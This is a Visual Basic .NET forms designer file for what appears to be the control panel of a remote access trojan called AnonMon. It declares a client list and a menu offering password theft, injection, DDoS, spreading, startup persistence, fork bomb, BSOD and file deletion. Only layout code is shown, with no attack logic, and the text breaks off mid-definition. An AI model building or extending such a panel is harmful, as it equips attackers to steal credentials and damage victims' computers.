<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Form1
    Inherits Custom_Form

    'Form remplace la méthode Dispose pour nettoyer la liste des composants.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Requise par le Concepteur Windows Form
    Private components As System.ComponentModel.IContainer

    'REMARQUE : la procédure suivante est requise par le Concepteur Windows Form
    'Elle peut être modifiée à l'aide du Concepteur Windows Form.  
    'Ne la modifiez pas à l'aide de l'éditeur de code.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.ListView2 = New System.Windows.Forms.ListView()
        Me.ColumnHeader6 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader7 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader8 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader9 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.REMOTE_TOOL = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.DesktopManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FileManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.TaskManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteViewerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ChangeWallPaperToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.TaskBarToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.HideToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShowToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.HideAppsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShowAppsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MouseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SwapMouseButtonToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ONToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.OFFToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MouseLockingToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LeftClickToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LeftLockToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LeftUnlockToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RightButtonToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RightLockToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RightUnlockToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MouseMovingToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MouveLockingToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MouveUnlockToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AllToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AllLockToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AllUnlockToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.KeyboardToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LockKeyboardToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UnlockKeyboardToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.IconsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShowIconsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.HideIconsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StartIconToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StartIconHideToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShowStartIconToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.GetPasswordsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.InjectionToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MiscToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MessageToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PowerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LogOutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShutDownToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.HibernateToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SuspendToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BSODToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DDOSToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.UDPToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.OSInformationToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SpreadToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AddToStarUpToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.VirusToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RedScreenToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ForkBombToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DeleteAllFilesOnDesktopToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DeleteFilesToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DeleteFilesRebootToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MonitorScreenToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RotateToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.R0ToolStripMenuItem2 = New System.Windows.Forms.ToolStripMenuItem()
        Me.R90ToolStripMenuItem3 = New System.Windows.Forms.ToolStripMenuItem()
        Me.R180ToolStripMenuItem4 = New System.Windows.Forms.ToolStripMenuItem()
        Me.R270ToolStripMenuItem5 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ClientToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseDeleteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.BuilderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.TestToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.Test1ToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Test2ToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AboutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ImageList1 = New System.Windows.Forms.ImageList(Me.components)
        Me.XuiCustomGroupbox2 = New XanderUI.XUICustomGroupbox()
        Me.PictureBox5 = New System.Windows.Forms.PictureBox()
        Me.AUTO_CHK_FILE = New XanderUI.XUICheckBox()
        Me.PictureBox4 = New System.Windows.Forms.PictureBox()
        Me.PictureBox3 = New System.Windows.Forms.PictureBox()
        Me.Auto_RECOV = New XanderUI.XUICheckBox()
        Me.XuiCheckBox1 = New XanderUI.XUICheckBox()
        Me.XuiCustomGroupbox1 = New XanderUI.XUICustomGroupbox()
        Me.XuiCustomGroupbox4 = New XanderUI.XUICustomGroupbox()
        Me.NumericUpDown2 = New System.Windows.Forms.NumericUpDown()
        Me.UcBtnExt1 = New HZH_Controls.Controls.UCBtnExt()
        Me.XuiCustomGroupbox3 = New XanderUI.XUICustomGroupbox()
        Me.NumericUpDown1 = New System.Windows.Forms.NumericUpDown()
        Me.Button1 = New System.Windows.Forms.Button()
        Me.Button2 = New System.Windows.Forms.Button()
        Me.Button3 = New System.Windows.Forms.Button()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.TabControlExt3 = New HZH_Controls.Controls.TabControlExt()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.AeroListView1 = New AnonMon.AeroListView()
        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader3 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader4 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ToolStrip1 = New System.Windows.Forms.ToolStrip()
        Me.TabPage4 = New System.Windows.Forms.TabPage()
        Me.UcBtnExt2 = New HZH_Controls.Controls.UCBtnExt()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
        Me.Label2 = New System.Windows.Forms.Label()
        Me.PictureBox2 = New System.Windows.Forms.PictureBox()
        Me.REMOTE_TOOL.SuspendLayout()
        Me.XuiCustomGroupbox2.SuspendLayout()
        CType(Me.PictureBox5, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox4, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox3, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.XuiCustomGroupbox1.SuspendLayout()
        Me.XuiCustomGroupbox4.SuspendLayout()
        CType(Me.NumericUpDown2, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.XuiCustomGroupbox3.SuspendLayout()
        CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabControlExt3.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.TabPage4.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'ListView2
        '
        Me.ListView2.BackColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.ListView2.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader6, Me.ColumnHeader7, Me.ColumnHeader8, Me.ColumnHeader9})
        Me.ListView2.ContextMenuStrip = Me.REMOTE_TOOL
        Me.ListView2.ForeColor = System.Drawing.Color.White
        Me.ListView2.HideSelection = False
        Me.ListView2.Location = New System.Drawing.Point(114, 166)
        Me.ListView2.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.ListView2.Name = "ListView2"
        Me.ListView2.Size = New System.Drawing.Size(263, 215)
        Me.ListView2.SmallImageList = Me.ImageList1
        Me.ListView2.TabIndex = 1
        Me.ListView2.UseCompatibleStateImageBehavior = False
        Me.ListView2.View = System.Windows.Forms.View.Details
        Me.ListView2.Visible = False
        '
        'ColumnHeader6
        '
        Me.ColumnHeader6.Text = "IP"
        Me.ColumnHeader6.Width = 209
        '
        'ColumnHeader7
        '
        Me.ColumnHeader7.Text = "OS"
        Me.ColumnHeader7.Width = 178
        '
        'ColumnHeader8
        '
        Me.ColumnHeader8.Text = "Username"
        Me.ColumnHeader8.Width = 209
        '
        'ColumnHeader9
        '
        Me.ColumnHeader9.Text = "Version"
        Me.ColumnHeader9.Width = 146
        '
        'REMOTE_TOOL
        '
        Me.REMOTE_TOOL.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
        Me.REMOTE_TOOL.ImageScalingSize = New System.Drawing.Size(24, 24)
        Me.REMOTE_TOOL.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.DesktopManagerToolStripMenuItem, Me.GetPasswordsToolStripMenuItem, Me.InjectionToolStripMenuItem, Me.MiscToolStripMenuItem, Me.ClientToolStripMenuItem, Me.BuilderToolStripMenuItem, Me.TestToolStripMenuItem1, Me.AboutToolStripMenuItem})
        Me.REMOTE_TOOL.Name = "ContextMenuStrip1"
        Me.REMOTE_TOOL.Size = New System.Drawing.Size(203, 244)
        '
        'DesktopManagerToolStripMenuItem
        '
        Me.DesktopManagerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.DesktopManagerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FileManagerToolStripMenuItem, Me.TaskManagerToolStripMenuItem, Me.RemoteViewerToolStripMenuItem, Me.ChangeWallPaperToolStripMenuItem, Me.TaskBarToolStripMenuItem, Me.MouseToolStripMenuItem, Me.KeyboardToolStripMenuItem, Me.IconsToolStripMenuItem, Me.StartIconToolStripMenuItem})
        Me.DesktopManagerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.DesktopManagerToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.a1a5b9494d50bb3754bba547f2d88487_computer_monitor_flat_icon_bmpy_vexels__1_
        Me.DesktopManagerToolStripMenuItem.Name = "DesktopManagerToolStripMenuItem"
        Me.DesktopManagerToolStripMenuItem.Size = New System.Drawing.Size(202, 30)
        Me.DesktopManagerToolStripMenuItem.Text = "Desktop Management "
        '
        'FileManagerToolStripMenuItem
        '
        Me.FileManagerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.FileManagerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.FileManagerToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.folder_IC1
        Me.FileManagerToolStripMenuItem.Name = "FileManagerToolStripMenuItem"
        Me.FileManagerToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.FileManagerToolStripMenuItem.Text = "File Manager"
        '
        'TaskManagerToolStripMenuItem
        '
        Me.TaskManagerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.TaskManagerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.TaskManagerToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_system_task
        Me.TaskManagerToolStripMenuItem.Name = "TaskManagerToolStripMenuItem"
        Me.TaskManagerToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.TaskManagerToolStripMenuItem.Text = "Task Manager"
        '
        'RemoteViewerToolStripMenuItem
        '
        Me.RemoteViewerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.RemoteViewerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StartToolStripMenuItem, Me.StopToolStripMenuItem})
        Me.RemoteViewerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.RemoteViewerToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_windows_cliegnt_32
        Me.RemoteViewerToolStripMenuItem.Name = "RemoteViewerToolStripMenuItem"
        Me.RemoteViewerToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.RemoteViewerToolStripMenuItem.Text = "Remote Viewer"
        '
        'StartToolStripMenuItem
        '
        Me.StartToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.StartToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.StartToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_record_64
        Me.StartToolStripMenuItem.Name = "StartToolStripMenuItem"
        Me.StartToolStripMenuItem.Size = New System.Drawing.Size(98, 22)
        Me.StartToolStripMenuItem.Text = "Start"
        '
        'StopToolStripMenuItem
        '
        Me.StopToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.StopToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.StopToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_stop_64
        Me.StopToolStripMenuItem.Name = "StopToolStripMenuItem"
        Me.StopToolStripMenuItem.Size = New System.Drawing.Size(98, 22)
        Me.StopToolStripMenuItem.Text = "Stop"
        '
        'ChangeWallPaperToolStripMenuItem
        '
        Me.ChangeWallPaperToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.ChangeWallPaperToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.ChangeWallPaperToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_pictures_folder
        Me.ChangeWallPaperToolStripMenuItem.Name = "ChangeWallPaperToolStripMenuItem"
        Me.ChangeWallPaperToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.ChangeWallPaperToolStripMenuItem.Text = "Change WallPaper"
        Me.ChangeWallPaperToolStripMenuItem.ToolTipText = "Please , do not use big file , currently not optimized !"
        '
        'TaskBarToolStripMenuItem
        '
        Me.TaskBarToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.TaskBarToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.HideToolStripMenuItem, Me.ShowToolStripMenuItem, Me.HideAppsToolStripMenuItem, Me.ShowAppsToolStripMenuItem})
        Me.TaskBarToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.TaskBarToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_minimize_window_641
        Me.TaskBarToolStripMenuItem.Name = "TaskBarToolStripMenuItem"
        Me.TaskBarToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.TaskBarToolStripMenuItem.Text = "TaskBar"
        '
        'HideToolStripMenuItem
        '
        Me.HideToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.HideToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.HideToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_hide
        Me.HideToolStripMenuItem.Name = "HideToolStripMenuItem"
        Me.HideToolStripMenuItem.Size = New System.Drawing.Size(133, 22)
        Me.HideToolStripMenuItem.Text = "Hide"
        '
        'ShowToolStripMenuItem
        '
        Me.ShowToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.ShowToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.ShowToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_edye
        Me.ShowToolStripMenuItem.Name = "ShowToolStripMenuItem"
        Me.ShowToolStripMenuItem.Size = New System.Drawing.Size(133, 22)
        Me.ShowToolStripMenuItem.Text = "Show"
        '
        'HideAppsToolStripMenuItem
        '
        Me.HideAppsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.HideAppsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.HideAppsToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_hide1
        Me.HideAppsToolStripMenuItem.Name = "HideAppsToolStripMenuItem"
        Me.HideAppsToolStripMenuItem.Size = New System.Drawing.Size(133, 22)
        Me.HideAppsToolStripMenuItem.Text = "Hide Apps"
        '
        'ShowAppsToolStripMenuItem
        '
        Me.ShowAppsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.ShowAppsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.ShowAppsToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_edye1
        Me.ShowAppsToolStripMenuItem.Name = "ShowAppsToolStripMenuItem"
        Me.ShowAppsToolStripMenuItem.Size = New System.Drawing.Size(133, 22)
        Me.ShowAppsToolStripMenuItem.Text = "Show Apps"
        '
        'MouseToolStripMenuItem
        '
        Me.MouseToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.MouseToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.SwapMouseButtonToolStripMenuItem, Me.MouseLockingToolStripMenuItem})
        Me.MouseToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.MouseToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_moussdfsdfe
        Me.MouseToolStripMenuItem.Name = "MouseToolStripMenuItem"
        Me.MouseToolStripMenuItem.Size = New System.Drawing.Size(171, 22)
        Me.MouseToolStripMenuItem.Text = "Mouse"
        '
        'SwapMouseButtonToolStripMenuItem
        '
        Me.SwapMouseButtonToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.SwapMouseButtonToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ONToolStripMenuItem, Me.OFFToolStripMenuItem})
        Me.SwapMouseButtonToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.SwapMouseButtonToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_swap_641
        Me.SwapMouseButtonToolStripMenuItem.Name = "SwapMouseButtonToolStripMenuItem"
        Me.SwapMouseButtonToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.SwapMouseButtonToolStripMenuItem.Text = "Swap Mouse Button"
        Me.SwapMouseButtonToolStripMenuItem.ToolTipText = "Swap Between Left and Right Mouse Button"
        '
        'ONToolStripMenuItem
        '
        Me.ONToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.ONToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.ONToolStripMenuItem.Name = "ONToolStripMenuItem"
        Me.ONToolStripMenuItem.Size = New System.Drawing.Size(95, 22)
        Me.ONToolStripMenuItem.Text = "ON"
        '
        'OFFToolStripMenuItem
        '
        Me.OFFToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.OFFToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.OFFToolStripMenuItem.Name = "OFFToolStripMenuItem"
        Me.OFFToolStripMenuItem.Size = New System.Drawing.Size(95, 22)
        Me.OFFToolStripMenuItem.Text = "OFF"
        '
        'MouseLockingToolStripMenuItem
        '
        Me.MouseLockingToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.MouseLockingToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LeftClickToolStripMenuItem, Me.RightButtonToolStripMenuItem, Me.MouseMovingToolStripMenuItem, Me.AllToolStripMenuItem})
        Me.MouseLockingToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.MouseLockingToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.iconfinder_mouse_delete_84782
        Me.MouseLockingToolStripMenuItem.Name = "MouseLockingToolStripMenuItem"
        Me.MouseLockingToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.MouseLockingToolStripMenuItem.Text = "Mouse Locking"
        '
        'LeftClickToolStripMenuItem
        '
        Me.LeftClickToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.LeftClickToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LeftLockToolStripMenuItem, Me.LeftUnlockToolStripMenuItem})
        Me.LeftClickToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.LeftClickToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_left_cgglick_32
        Me.LeftClickToolStripMenuItem.Name = "LeftClickToolStripMenuItem"
        Me.LeftClickToolStripMenuItem.Size = New System.Drawing.Size(154, 22)
        Me.LeftClickToolStripMenuItem.Text = "Left Button"
        '
        'LeftLockToolStripMenuItem
        '
        Me.LeftLockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.LeftLockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.LeftLockToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_locks_64
        Me.LeftLockToolStripMenuItem.Name = "LeftLockToolStripMenuItem"
        Me.LeftLockToolStripMenuItem.Size = New System.Drawing.Size(134, 22)
        Me.LeftLockToolStripMenuItem.Text = "Left Lock"
        '
        'LeftUnlockToolStripMenuItem
        '
        Me.LeftUnlockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.LeftUnlockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.LeftUnlockToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_padlosqdck_64
        Me.LeftUnlockToolStripMenuItem.Name = "LeftUnlockToolStripMenuItem"
        Me.LeftUnlockToolStripMenuItem.Size = New System.Drawing.Size(134, 22)
        Me.LeftUnlockToolStripMenuItem.Text = "Left Unlock"
        '
        'RightButtonToolStripMenuItem
        '
        Me.RightButtonToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.RightButtonToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RightLockToolStripMenuItem, Me.RightUnlockToolStripMenuItem})
        Me.RightButtonToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.RightButtonToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_mouse_right_click_642
        Me.RightButtonToolStripMenuItem.Name = "RightButtonToolStripMenuItem"
